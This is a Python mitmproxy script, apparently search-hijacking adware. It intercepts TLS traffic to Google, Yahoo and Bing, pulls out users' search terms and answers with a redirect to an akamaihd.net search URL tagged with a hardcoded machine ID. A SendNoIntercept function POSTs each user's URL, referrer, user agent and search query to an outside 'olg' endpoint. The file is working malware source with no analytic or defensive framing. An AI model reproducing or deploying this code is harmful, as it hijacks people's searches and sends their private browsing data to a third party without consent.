import collections
import random
import datetime

from enum import Enum

import mitmproxy
from mitmproxy import ctx
from mitmproxy.exceptions import TlsProtocolException
from mitmproxy.proxy.protocol import TlsLayer, RawTCPLayer
import re
from mitmproxy.net.http import Headers
from mitmproxy.http import HTTPResponse

import json
import urllib
try:
    import urllib.request as urllib2
except ImportError:
    import urllib2

class _TlsStrategy:
    def __init__(self):
        pass

    def should_intercept(self, server_address):
        raise NotImplementedError()


class ConservativeStrategy(_TlsStrategy):
    def should_intercept(self, server_address):
        return GetInterceptableDomainId(server_address[0]) != None


class TlsFeedback(TlsLayer):
    def _establish_tls_with_client(self):
        server_address = self.server_conn.address

        try:
            super(TlsFeedback, self)._establish_tls_with_client()
        except TlsProtocolException as e:
            raise e


# global variables
machineId = "408370C2-0701-5C9D-A31A-0D08C9979F34"
br = "22"
searchUrl = "http://default120622-a.akamaihd.net/ps?_pg=408370C2-0701-5C9D-A31A-0D08C9979F34&q=@@SearchTerm@@"
interceptableDomains = {"1":[{"Id":"1","Domain":".google.","IsRegex":"False"}],"2":[{"Id":"2","Domain":".yahoo.","IsRegex":"False"}],"3":[{"Id":"3","Domain":".bing.","IsRegex":"False"}]}
searchMatches = {"1":{"Id":"1","MatchRegex":"https?://[^/]*/search.*?[?&]q=","SearchQueryParam":"q"},"2":{"Id":"2","MatchRegex":"/search.*?p=","SearchQueryParam":"p"},"3":{"Id":"3","MatchRegex":"^https?:\\/\\/[^\\/]*\\/search.*?[?&]q=((?!AEE67B61E61).)*$","SearchQueryParam":"q"}}
domainMaps = {"1":["1"],"2":["2"],"3":["3"]}
userAgents = [".*?\\)\\s*[^\\)]+(?:(?<!Chrome)/[0-9\\.]+ Safari/([0-9\\.]+))$"]
referrerChecks = {}
tls_strategy = None
intercepts = {}
yahooTypeTagRegexes = [re.compile(r'type=ANYS_.*$', re.M|re.I), re.compile(r'type=Tarrv_.*$', re.M|re.I), re.compile(r'type=[^&]*__alt__ddc_srch_searchpulse_net', re.M|re.I), re.compile(r'hspart=sz&.*?type=type801[^&]*', re.M|re.I)]
isGoogleMapRegex = re.compile(r'^https?://[^/]*\.google\.co[^/]*/.*[?&]tbm=map.*', re.M|re.I)
searchParamString = '[?&]na=([^&]+)'
scriptVersion = 1.0
responseBodyTemplate = """
<!DOCTYPE html>
<html>
  <head>
    <meta name="referrer" content="no-referrer" />
    <meta http-equiv="Refresh" content="0; url=@@RedirectUrl@@" />
  </head>
</html>
"""


def load(l):
    pass


def configure(updated):
    global tls_strategy
    tls_strategy = ConservativeStrategy()


def next_layer(next_layer):
    if isinstance(next_layer, TlsLayer) and next_layer._client_tls:
        server_address = next_layer.server_conn.address

        if tls_strategy.should_intercept(server_address):
            next_layer.__class__ = TlsFeedback
        else:
            #mitmproxy.ctx.log("TLS passthrough for %s" % repr(next_layer.server_conn.address), "info")
            next_layer_replacement = RawTCPLayer(next_layer.ctx, ignore=True)
            next_layer.reply.send(next_layer_replacement)


def GetInterceptableDomainId(domain):
    for key, interceptableDomainGroup in interceptableDomains.items():
        for interceptableDomain in interceptableDomainGroup:
            if (interceptableDomain['IsRegex'] == 'True' and re.match(interceptableDomain['Domain'], domain)) or (interceptableDomain['IsRegex'] == 'False' and interceptableDomain['Domain'] in domain):
                return interceptableDomain['Id']
    return None

def SendNoIntercept(url, userAgent, referrer, searchTerm, reason):
    #ctx.log.info("------------Entered SendNoIntercept: %s------------" % reason)

    data = {
        "ev": "pdt",
        "sv": scriptVersion,
        "rf": urllib.parse.quote(referrer),
        "ua": userAgent,
        "cg": machineId,
        "br": br,
        "u": urllib.parse.quote(url),
        "st": urllib.parse.quote(searchTerm),
        "r": reason
    }

    try:
        json_data = json.dumps(data).encode("utf-8")
        method = "POST"
        handler = urllib2.HTTPHandler()
        opener = urllib2.build_opener(handler)
        request = urllib2.Request("http://default120622-a.akamaihd.net/olg", data=json_data)
        request.add_header("Content-Type",'application/json')
        request.get_method = lambda: method
        connection = opener.open(request)
    except Exception as e:
        #ctx.log.error("------------Error sending message ------------\n%s:\n%s" % (e.__doc__, e.message))
        pass


def request(flow):
    searchTerm = ""
    referrer = flow.request.headers.get("Referer") or ""
    userAgent = flow.request.headers.get("User-Agent") or ""

    # abort if userAgent not in whitelist
    userAgentMatches = False
    for ua in userAgents:
        userAgentMatches = userAgentMatches or (re.match(ua, userAgent) != None)

    if not userAgentMatches:
        #SendNoIntercept(flow.request.url, userAgent, referrer, "UA mismatch")
        return

    # get domain id if it exists
    domainId = GetInterceptableDomainId(flow.request.host)

    # abort if domain id was not found
    if domainId == None:
        return

    # get valid search string ids
    validDomainMaps = domainMaps[domainId]

    # abort if there are no search strings
    if validDomainMaps == None or not validDomainMaps:
        return

    for mapMatchId in validDomainMaps:
        try:
            searchMatchItem = searchMatches[mapMatchId]
            if searchMatchItem == None or not searchMatchItem:
                continue
            if re.search(searchMatchItem['MatchRegex'], flow.request.url) != None:
                searchQueryRegex = searchParamString.replace("na", searchMatchItem['SearchQueryParam'])
                searchTerm = re.search(searchQueryRegex, flow.request.url).group(1)
                break
        except:
            pass

    skipReferrerCheck = referrerChecks.get(domainId, 'False')

    if not searchTerm:
        #SendNoIntercept(flow.request.url, userAgent, referrer, "No search term")
        return

    # abort if yahoo typetag matches blacklist
    if 'search.yahoo' in flow.request.host:
        for pattern in yahooTypeTagRegexes:
            if re.search(pattern, flow.request.url) != None:
                SendNoIntercept(flow.request.url, userAgent, referrer, searchTerm, "Yahoo typetag blacklist")
                return

    # abort if google maps
    if re.match(isGoogleMapRegex, flow.request.url) != None:
        return

    # abort if no referer
    if skipReferrerCheck != 'True' and (referrer) != "":
        SendNoIntercept(flow.request.url, userAgent, referrer, searchTerm, "Referrer exists")
        return

    # abort if request has already been made within the threshold
    requestTime = datetime.datetime.now()
    lastRequestTime = requestTime + datetime.timedelta(days=-1)
    if flow.request.url in intercepts:
        lastRequestTime = intercepts[flow.request.url]
    timeDifference = requestTime - lastRequestTime
    maxTimeDifference = datetime.timedelta(seconds=5)
    if maxTimeDifference >= timeDifference:
        SendNoIntercept(flow.request.url, userAgent, referrer, searchTerm, "Repeat search")
        return

    intercepts[flow.request.url] = datetime.datetime.now()
    flow.request.headers["Referer"] = ""
    redirectUrl = searchUrl.replace("@@SearchTerm@@", searchTerm)
    if (referrer) != "":
        redirectUrl = redirectUrl + "&s=" + domainId
    responseBody = responseBodyTemplate.replace("@@RedirectUrl@@", redirectUrl)
    flow.response = HTTPResponse.make(
        302,  # (optional) status code
        responseBody.encode('utf-8'),  # (optional) content
        {"Content-Type": "text/html"} # (optional) headers
    )
